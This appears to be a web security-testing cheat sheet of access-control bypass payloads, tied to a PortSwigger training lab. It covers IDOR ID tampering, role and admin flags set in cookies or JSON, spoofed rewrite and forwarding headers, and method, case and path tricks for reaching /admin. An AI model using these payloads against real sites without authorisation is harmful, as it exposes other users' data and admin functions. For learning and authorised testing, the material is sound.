# Access Control - Payload Reference

## IDOR (Insecure Direct Object Reference)

### Numeric ID Tampering
```
GET /api/v1/users/123  →  GET /api/v1/users/1    # Try other user IDs
GET /api/v1/users/123  →  GET /api/v1/users/2
GET /api/v1/users/123  →  GET /api/v1/users/admin
```

### UUID/GUID Enumeration
```
# If UUIDs are used, check:
# - API responses that leak other users' UUIDs
# - Predictable UUID patterns (time-based v1)
# - Referrer headers leaking UUIDs
```

## Role/Privilege Escalation

### Request Parameter Tampering
```
Cookie: role=admin
Cookie: admin=true
Cookie: isAdmin=1
Hidden field: <input name="role" value="admin">
JSON body: {"role": "admin", "isAdmin": true}
```

### PortSwigger Lab Approach
```
# Lab: User role controlled by request parameter
1. Login as normal user
2. Check request/response for role parameter
3. Change role=administrator in cookie/param
4. Access admin panel
```

### HTTP Header Manipulation
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
```

## Method-Based Bypass
```
GET /admin    → 403 Forbidden
POST /admin   → 200 OK
PUT /admin    → 200 OK
OPTIONS /admin → Allow: GET, POST, PUT
```

## URL Case Bypass
```
/Admin
/ADMIN
/adMin
```

## Path Bypass
```
/admin/
/admin/.
/./admin
/admin%20
/admin#
/admin..;
```
